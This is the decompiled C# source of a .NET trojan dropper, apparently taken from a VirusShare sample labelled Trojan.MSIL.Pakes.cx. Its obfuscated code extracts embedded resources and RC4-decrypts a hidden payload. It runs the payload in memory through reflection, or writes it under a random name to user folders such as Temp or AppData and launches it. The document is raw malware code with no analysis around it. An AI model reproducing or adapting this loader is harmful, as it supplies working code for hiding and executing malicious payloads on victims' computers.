// Decompiled with JetBrains decompiler
// Type: h5ujlmy3tnldxk1xj.qbtgthkfdtdkregzw5sbjritg
// Assembly: net, Version=15.4.3508.1109, Culture=neutral, PublicKeyToken=null
// MVID: A137FCB5-FE00-42D4-8178-C1BBFD9418C8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Pakes.cx-23a264c6feb6b4bc57f469957ada226bb861d6f4ace142613d18e30195c1e926.exe

using A;
using jjbyfmanvwf3fcjqxg0dm4lt2;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace h5ujlmy3tnldxk1xj
{
  public class qbtgthkfdtdkregzw5sbjritg
  {
    private static bool cb328a725d56a5f4c35f2f7c02a5bd228 = true;
    private byte[] ce0164d053d806b7c35ef4d6f64459821;
    private string cb3e1a00ad6de83362fb300d25c1a57d0 = Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(869));
    private string c91836dc2ab9789b73b3d04bfe94071ef = string.Empty;
    private string cd933a40ffdc697c40c81635c1e8efc5d = string.Empty;
    private int c22bd5ce84ab204d694f05398e2c10b98;
    private bool c91fef3c33b84b4f396c54da8206d69bd;
    private bool cba893a6240ee4c99c92572bc0977343b;
    private string c92043dfe501872db97b0d10bad8dab76 = string.Empty;
    private string c89b323e9d3e4bc0877e13b3f71248c1a = string.Empty;
    private object c87fe99bbcc3da4044cff001ab87a8991;
    private MethodInfo cf82ef5faba39ff11323b80cc07c01156;

    private object c0060c02619fa07057cc111742ba0844d(int ca116803b7a99aff66b7a92076918aa52)
    {
      Assembly assembly = Assembly.Load(Urds1z1wtoob4waskjjcwebqs.Kdsdgtxvv1fwlfukxzrga1x3h(qbtgthkfdtdkregzw5sbjritg.Iorb2w43loblhrpwo(Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(1)))));
      Thread.Sleep(1000);
      System.Type type = assembly.GetTypes()[ca116803b7a99aff66b7a92076918aa52];
      this.cf82ef5faba39ff11323b80cc07c01156 = type.GetMethod(Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(20)));
      return Activator.CreateInstance(type);
    }

    public static byte[] Iorb2w43loblhrpwo(string Vtqbnna0vaiunzs0c)
    {
      using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Vtqbnna0vaiunzs0c))
      {
        byte[] buffer = new byte[1024];
        using (MemoryStream memoryStream = new MemoryStream())
        {
          while (true)
          {
            int count = manifestResourceStream.Read(buffer, 0, buffer.Length);
            if (count > 0)
              memoryStream.Write(buffer, 0, count);
            else
              break;
          }
          return memoryStream.ToArray();
        }
      }
    }

    private byte[] cb590b5b22d9efc5b95bc92ddce5227b9(byte[] cb1be5ab7eb896fd13f8e879c24425b0d)
    {
      if (this.cb3e1a00ad6de83362fb300d25c1a57d0 == Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(27)))
        Urds1z1wtoob4waskjjcwebqs.RC4(ref cb1be5ab7eb896fd13f8e879c24425b0d, xjelt1xzblpwevvmag5rnjzve32rhy4yl.Ey53uxfwuo1z4ftrs(this.c91836dc2ab9789b73b3d04bfe94071ef));
      return cb1be5ab7eb896fd13f8e879c24425b0d;
    }

    private static void c8c544be5c75eefdc483b7e04682d902c(byte[] cad8be6fd54e41c543b7e79c7ccc6e6eb)
    {
      try
      {
        Thread thread = new Thread(new ParameterizedThreadStart(qbtgthkfdtdkregzw5sbjritg.ca4fab8035a423fab66890a0f9be2fed4));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start((object) cad8be6fd54e41c543b7e79c7ccc6e6eb);
        thread.Join();
      }
      catch
      {
        qbtgthkfdtdkregzw5sbjritg.cb328a725d56a5f4c35f2f7c02a5bd228 = false;
      }
    }

    private static void ca4fab8035a423fab66890a0f9be2fed4(object c5bea8f1bcf80d14a89aaabf6577dff60)
    {
      try
      {
        MethodInfo entryPoint = Assembly.Load((byte[]) c5bea8f1bcf80d14a89aaabf6577dff60).EntryPoint;
        if (entryPoint.GetParameters().Length == 1)
          entryPoint.Invoke((object) null, new object[1]
          {
            (object) new string[0]
          });
        else
          entryPoint.Invoke((object) null, (object[]) null);
      }
      catch
      {
        qbtgthkfdtdkregzw5sbjritg.cb328a725d56a5f4c35f2f7c02a5bd228 = false;
      }
    }

    private bool c342dc8e8e5f3f63219c0e8e43530cf23(byte[] c8ab6d60cfb93e6fc5f307d7ba720c3b6)
    {
      qbtgthkfdtdkregzw5sbjritg.c8c544be5c75eefdc483b7e04682d902c(c8ab6d60cfb93e6fc5f307d7ba720c3b6);
      bool cb328a725d56a5f4c35f2f7c02a5bd228 = qbtgthkfdtdkregzw5sbjritg.cb328a725d56a5f4c35f2f7c02a5bd228;
      qbtgthkfdtdkregzw5sbjritg.cb328a725d56a5f4c35f2f7c02a5bd228 = true;
      return cb328a725d56a5f4c35f2f7c02a5bd228;
    }

    private void cffc7c3d1eed33e78ab120622162bdb46(
      byte[] c83b1fb4d551712e0cc1418a59c54acbd,
      string c7c6c9eeab3bc37a8c90ea89fab68a1cd,
      bool c8f927366d5a87a12c6b0bbc8a7869df0)
    {
      try
      {
        File.WriteAllBytes(c7c6c9eeab3bc37a8c90ea89fab68a1cd, c83b1fb4d551712e0cc1418a59c54acbd);
        if (!c8f927366d5a87a12c6b0bbc8a7869df0)
          return;
        new Process()
        {
          StartInfo = {
            FileName = c7c6c9eeab3bc37a8c90ea89fab68a1cd
          }
        }.Start();
      }
      catch
      {
      }
    }

    private byte[] cb716513ba4c90d1faf01e700869946c3(
      string c4becd67bfddee048f71b5038621a8aad,
      int c7fd4b1e5f3eef4e4463570dac8ee9430,
      string c4b2868005351317218daee6721fcef4e)
    {
      try
      {
        IntPtr hModule = majdcbl3z2ygng2ubtt5syebj.D5kge1nujvdjzhv0jghbiqxxz(string.Empty);
        IntPtr hResInfo = majdcbl3z2ygng2ubtt5syebj.Zuiqftto0ycdigqdj2bliy2ze(hModule, c7fd4b1e5f3eef4e4463570dac8ee9430, c4b2868005351317218daee6721fcef4e);
        uint length = majdcbl3z2ygng2ubtt5syebj.Kiu4wfxns4qkmxvobjd4lulyv(hModule, hResInfo);
        IntPtr source = majdcbl3z2ygng2ubtt5syebj.Qwkx02hqegloe50zymjvgishq(hModule, hResInfo);
        byte[] destination = new byte[(IntPtr) length];
        Marshal.Copy(source, destination, 0, (int) length);
        return destination;
      }
      catch (Exception ex)
      {
        Console.WriteLine(Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(34)) + Environment.NewLine + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(83)) + ex.Message);
        return (byte[]) null;
      }
    }

    private string ca4821272955581cfb3bc9722a9819bf2(string cbd32a66846c8346f4104504dea17743c)
    {
      if (cbd32a66846c8346f4104504dea17743c == Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(108)))
        cbd32a66846c8346f4104504dea17743c = Application.StartupPath + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(141));
      if (cbd32a66846c8346f4104504dea17743c == Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(144)))
        cbd32a66846c8346f4104504dea17743c = Path.GetTempPath();
      if (cbd32a66846c8346f4104504dea17743c == Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(153)))
        cbd32a66846c8346f4104504dea17743c = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(141));
      if (cbd32a66846c8346f4104504dea17743c == Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(168)))
        cbd32a66846c8346f4104504dea17743c = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(141));
      if (cbd32a66846c8346f4104504dea17743c == Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(193)))
        cbd32a66846c8346f4104504dea17743c = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(141));
      if (cbd32a66846c8346f4104504dea17743c == Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(208)))
        cbd32a66846c8346f4104504dea17743c = Environment.GetEnvironmentVariable(Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(233))) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(141));
      if (cbd32a66846c8346f4104504dea17743c == Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(256)))
        cbd32a66846c8346f4104504dea17743c = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(141));
      return cbd32a66846c8346f4104504dea17743c;
    }

    private string ca47fea07c3bebd4fb8b13138d0b1b0db(string cfb24d7fd223745044ea3ffa968812e90)
    {
      string str = string.Empty;
      if (cfb24d7fd223745044ea3ffa968812e90 == Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(283)))
        str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(141));
      if (cfb24d7fd223745044ea3ffa968812e90 == Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(286)))
        str = Path.GetTempPath();
      if (cfb24d7fd223745044ea3ffa968812e90 == Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(289)))
        str = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(141));
      return str;
    }

    private void c7a18ce30d7bdbef4b324bd7078297ea9(string cb1be5ab7eb896fd13f8e879c24425b0d)
    {
      string[] separator1 = new string[1]
      {
        Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(292))
      };
      cb1be5ab7eb896fd13f8e879c24425b0d.Split(separator1, StringSplitOptions.None);
      string[] separator2 = new string[1]
      {
        Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(343))
      };
      string[] strArray1 = cb1be5ab7eb896fd13f8e879c24425b0d.Split(separator2, StringSplitOptions.None);
      string[] separator3 = new string[1]
      {
        Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(394))
      };
      string[] strArray2 = cb1be5ab7eb896fd13f8e879c24425b0d.Split(separator3, StringSplitOptions.None);
      string[] separator4 = new string[1]
      {
        Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(429))
      };
      cb1be5ab7eb896fd13f8e879c24425b0d.Split(separator4, StringSplitOptions.None);
      this.cb3e1a00ad6de83362fb300d25c1a57d0 = strArray1[1];
      this.c91836dc2ab9789b73b3d04bfe94071ef = strArray1[2];
      this.cd933a40ffdc697c40c81635c1e8efc5d = strArray1[3];
      this.c22bd5ce84ab204d694f05398e2c10b98 = Convert.ToInt32(strArray2[1]);
      this.c91fef3c33b84b4f396c54da8206d69bd = Convert.ToBoolean(strArray2[16]);
      this.cba893a6240ee4c99c92572bc0977343b = Convert.ToBoolean(strArray2[17]);
      this.c92043dfe501872db97b0d10bad8dab76 = this.ca4821272955581cfb3bc9722a9819bf2(strArray2[18]) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(141)) + Path.GetRandomFileName();
      this.c89b323e9d3e4bc0877e13b3f71248c1a = strArray2[20];
      this.c92043dfe501872db97b0d10bad8dab76 = this.c92043dfe501872db97b0d10bad8dab76.Substring(0, this.c92043dfe501872db97b0d10bad8dab76.Length - 4) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(480));
      Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
      string c89b323e9d3e4bc0877e13b3f71248c1a;
      if ((c89b323e9d3e4bc0877e13b3f71248c1a = this.c89b323e9d3e4bc0877e13b3f71248c1a) == null)
        return;
      if (!(c89b323e9d3e4bc0877e13b3f71248c1a == c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(283)))
      {
        if (!(c89b323e9d3e4bc0877e13b3f71248c1a == c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(286)))
          return;
        this.c89b323e9d3e4bc0877e13b3f71248c1a = Environment.GetEnvironmentVariable(Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(489))) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(680));
      }
      else
      {
        try
        {
          if (IntPtr.Size == 4)
            this.c89b323e9d3e4bc0877e13b3f71248c1a = Environment.GetEnvironmentVariable(Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(489))) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(502));
          else
            this.c89b323e9d3e4bc0877e13b3f71248c1a = Environment.GetEnvironmentVariable(Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(489))) + Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(589));
        }
        catch (Exception ex)
        {
        }
      }
    }

    public void k1m3loxmmjqgq5simku0mrlt2()
    {
      string executablePath = Application.ExecutablePath;
      try
      {
        this.c7a18ce30d7bdbef4b324bd7078297ea9(xjelt1xzblpwevvmag5rnjzve32rhy4yl.eubkjmyiz1ivj5id3(this.cb716513ba4c90d1faf01e700869946c3(executablePath, 87, Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(767)))));
        this.ce0164d053d806b7c35ef4d6f64459821 = this.cb716513ba4c90d1faf01e700869946c3(executablePath, 91, Urds1z1wtoob4waskjjcwebqs.D0m30kgqe110xol4nvtqtinn3(c20d0cffccd6dc5adbb96a36882476ba1.c61fe7668f61d28eef79481c480f2dd83(834)));
        this.ce0164d053d806b7c35ef4d6f64459821 = this.cb590b5b22d9efc5b95bc92ddce5227b9(this.ce0164d053d806b7c35ef4d6f64459821);
        if (this.c91fef3c33b84b4f396c54da8206d69bd)
          this.c342dc8e8e5f3f63219c0e8e43530cf23(this.ce0164d053d806b7c35ef4d6f64459821);
        if (!this.cba893a6240ee4c99c92572bc0977343b)
          return;
        this.cffc7c3d1eed33e78ab120622162bdb46(this.ce0164d053d806b7c35ef4d6f64459821, this.c92043dfe501872db97b0d10bad8dab76, true);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    private static void cebbc1d9c27517b05e47877a297b7db87(string[] c887af87eabb326bcc2391ea75a0aae92)
    {
      ceb562aff020f9bdc8cc736dbc668c704.c46986238c6721588f7dd03501b3a2d53();
      new qbtgthkfdtdkregzw5sbjritg().k1m3loxmmjqgq5simku0mrlt2();
    }
  }
}
